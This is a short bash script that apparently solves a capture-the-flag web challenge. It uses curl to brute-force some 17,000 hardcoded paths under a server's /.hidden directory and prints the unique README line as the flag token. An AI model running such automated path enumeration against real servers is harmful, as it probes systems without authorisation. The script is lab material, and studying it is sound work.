#!/bin/bash

OUTPUT_FILE=brute-force-output

IPADDR=${1:?"missing ipaddr of the server"}

declare -a PATHS1=(
    "amcbevgondgcrloowluziypjdh"
    "bnqupesbgvhbcwqhcuynjolwkm"
    "ceicqljdddshxvnvdqzzjgddht"
    "doxelitrqvhegnhlhrkdgfizgj"
    "eipmnwhetmpbhiuesykfhxmyhr"
    "ffpbexkomzbigheuwhbhbfzzrg"
    "ghouhyooppsmaizbmjhtncsvfz"
    "hwlayeghtcotqdigxuigvjufqn"
    "isufpcgmngmrotmrjfjonpmkxu"
    "jfiombdhvlwxrkmawgoruhbarp"
    "kpibbgxjqnvrrcpczovjbvijmz"
    "ldtafmsxvvydthtgflzhadiozs"
    "mrucagbgcenowkjrlmmugvztuh"
    "ntyrhxjbtndcpjevzurlekwsxt"
    "oasstobmotwnezhscjjopenjxy"
    "ppjxigqiakcrmqfhotnncfqnqg"
    "qcwtnvtdfslnkvqvzhjsmsghfw"
    "rlnoyduccpqxkvcfiqpdikfpvx"
    "sdnfntbyirzllbpctnnoruyjjc"
    "trwjgrgmfnzarxiiwvwalyvanm"
    "urhkbrmupxbgdnntopklxskvom"
    "viphietzoechsxwqacvpsodhaq"
    "whtccjokayshttvxycsvykxcfm"
    "xuwrcwjjrmndczfcrmwmhvkjnh"
    "yjxemfsgdlkbvvtjiylhdoaqkn"
    "zzfzjvjsupgzinctxeqtzzdzll"
)

declare -a PATHS2=(
    "acbnunauucfplzmaglkvqgswwn"
    "bvwrujeymrvzurvywnjxzlfkwa"
    "ccevyakvydrjhsvbnwvestcfeb"
    "dephqnhvretuprssiccazdpwyt"
    "eotxvxzbogrepmvuiplzkfjohm"
    "fnkbjkxzduuctvrzpvpdsllkwm"
    "gubyklkxvljikilfdqyajypgpt"
    "hycgkytgbrqobqkozszhfgmven"
    "igeemtxnvexvxezqwntmzjltkt"
    "jzqhwxudbzrxyesccqbirteemr"
    "keyczixybfxybczctwbarfcjhk"
    "lacqgphmpkmzjmaojyqnasjyvj"
    "mrbnakzcmpldxxsjjssyujjvbx"
    "nvvgvrrnuepeduqsfwrcocoixo"
    "odgxyhuvecqvvfpzvtermzwisa"
    "pyvqjseoycohylldbjajacgwgx"
    "qihvsavsvodnsrnwhwxsjcwscf"
    "rtenpnkzuftuclrqrglitjsrgk"
    "sbkitppotcdimedtxzwlrocxbm"
    "ttlemtrngbjvrxotdxihcbhdzu"
    "uuqwurkperbaipglabcxpwcogm"
    "vsjtwjnsblouvdzmhzwwfiwimv"
    "wxkyoqkiafgluzmfpgcthpainy"
    "xpvwxitxurnldvlkeyedmlsson"
    "ycdpkqpcolzyfwsyjfehsolqvq"
    "zcgkxuyzzplsfnisngzlayvgee"
)

declare -a PATHS3=(
    "ayuprpftypqspruffmkuucjccv"
    "becskiwlclcuqxshqmxhicouoj"
    "cqqssunxyhjgdwjoafgyzoollx"
    "dupoqdxhvrbqhaqokxsiigjnph"
    "emdxzqwvfkmkjvfbyxizowjlqr"
    "ftzcgojutitjfpqrdadyfewfov"
    "gtmgedazcchqobjyuufjkxmmam"
    "hrgjwugrgpxlrwntddjeoizipk"
    "iumzgolywwwsdqbunmlkagpfqu"
    "juavephzegfusfrqelvumphzat"
    "kbjjgbfcbchslgysntmtmcxzyr"
    "lmpanswobhwcozdqixbowvbrhw"
    "mfmtemmsbpftlvuuuwitbydbbt"
    "nzzuqitxumdibwksdfdbczvahq"
    "oehtfkmejiwsbvoqyztwllaqqb"
    "pupwvwozdhgnvmzdktffjxfiqc"
    "qtbemrfggdbetcjaiyvwxagqhn"
    "raetkuxexbsoiywlcceelgpkdl"
    "shdualhcrcmmzslakailyvnbbt"
    "tojkymyisskfbmweakfvwghyqs"
    "uwohzpdobnmnlwhfgmhsjnvtss"
    "vpaznrumfdlwgbxuqnfmunthun"
    "wqjklbcbceqvyecbsaityellly"
    "xhytouigdvshzvldngdskfmkpf"
    "yivtvgtfhotbwchtwottzwghaa"
    "zrhmbyumtnjbgoiwkksmroifhb"
)

for p1 in "${PATHS1[@]}"
do
    for p2 in "${PATHS2[@]}"
    do
        for p3 in "${PATHS3[@]}"
        do
            curl http://$IPADDR/.hidden/$p1/$p2/$p3/README 2>/dev/null >> $OUTPUT_FILE
        done
    done
done

echo "Token: "
sort $OUTPUT_FILE | uniq -u